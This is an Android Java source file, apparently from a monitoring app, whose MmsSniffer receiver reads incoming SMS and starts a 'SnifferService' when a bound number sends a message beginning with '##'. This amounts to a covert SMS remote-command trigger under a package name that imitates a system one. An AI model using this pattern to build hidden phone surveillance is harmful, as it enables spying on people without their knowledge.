package com.android.mumassistant.control;

import java.util.ArrayList;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class MmsSniffer extends BroadcastReceiver{

	private final String TAG = "MmsSniffer";
	private String mContent;
	private String mAddress;
	private String mBindaddress;
	private String mTargcontent;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		
		SharedPreferences shp = PreferenceManager.getDefaultSharedPreferences(context);
		boolean run_app = shp.getBoolean("run_app", false);
		if(false == run_app){
			return;
		}
		if("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())){
			
			
			Object[] pdus = (Object[]) intent.getExtras().get("pdus");
			for (Object pdu : pdus) {
				SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);				
				mContent = message.getMessageBody();				
				mAddress = message.getOriginatingAddress(); 
			}
			mBindaddress = shp.getString("number_edit", "0000");
			mTargcontent = mContent.substring(0,2);

			try{
				if((mAddress.indexOf(mBindaddress) >= 1) && ("##".equals(mTargcontent))){
					
					if(isWorked(context)){
						Intent intent_stop = new Intent(context,SnifferService.class);
						context.stopService(intent_stop);
					}
					
					Intent intentsniffer = new Intent(context,SnifferService.class);
					Bundle snifferbundle = new Bundle();
					snifferbundle.putString("Message", mContent);
					intentsniffer.putExtras(snifferbundle); 
					context.startService(intentsniffer);
				}
			}catch(Exception e){
				Log.v(TAG,"exception:" + e);
			}
		}
	}
	
	public static boolean isWorked(Context context)
	 {
	  ActivityManager myManager=(ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);
	  ArrayList<RunningServiceInfo> runningService = (ArrayList<RunningServiceInfo>) myManager.getRunningServices(30);
	  for(int i = 0 ; i<runningService.size();i++)
	  {
		   if(runningService.get(i).service.getClassName().toString().equals("com.android.mumassistant.control.snifferService"))
		   {
			   return true;
		   }
	  }
	  return false;
	 }
}